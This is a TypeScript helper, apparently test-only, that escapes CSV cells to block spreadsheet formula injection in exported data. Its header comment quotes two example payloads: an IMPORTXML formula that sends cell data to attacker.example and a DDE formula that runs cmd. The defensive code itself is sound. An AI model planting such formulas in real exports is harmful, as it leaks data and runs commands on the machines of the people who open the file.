/**
 * CSV / spreadsheet formula-injection reference implementation — TEST-ONLY, owned by A10.
 *
 * Threat (SEC-CSV-01): a customer sets a HubSpot contact property, a workflow name or a
 * support subject to `=IMPORTXML("https://attacker.example/?d="&A1&B1,"//x")` or
 * `=cmd|'/c calc'!A0`. We faithfully record it as evidence. A workspace admin — or,
 * worse, the platform owner exporting a support queue — opens the CSV in Excel, Google
 * Sheets or LibreOffice and the formula executes with their credentials and their
 * network position. This exfiltrates the whole export to an attacker-controlled host.
 * Escaping for HTML does nothing here; CSV needs its own encoding step.
 *
 * Rule: a cell whose first character is one of = + - @ TAB CR gets a leading apostrophe.
 * The apostrophe must be added BEFORE RFC4180 quoting, and must be applied even to
 * values that will be quoted — quoting alone does not stop Excel evaluating a formula.
 *
 * A09 (export/deletion) and A07 (owner exports) must route every cell through `csvCell`.
 */

/** Characters that begin a formula in Excel, Google Sheets, LibreOffice or Numbers. */
const FORMULA_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/** Escapes one value for RFC4180 CSV, neutralising spreadsheet formula evaluation. */
export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  let text = String(value);
  const first = text.charAt(0);
  if (first !== '' && FORMULA_LEADERS.has(first)) {
    text = `'${text}`;
  }
  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

/** Joins one record. Uses CRLF, which is what RFC4180 specifies. */
export function csvRow(values: readonly (string | number | null | undefined)[]): string {
  return values.map(csvCell).join(',');
}

export function csvDocument(
  rows: readonly (readonly (string | number | null | undefined)[])[],
): string {
  return rows.map(csvRow).join('\r\n');
}
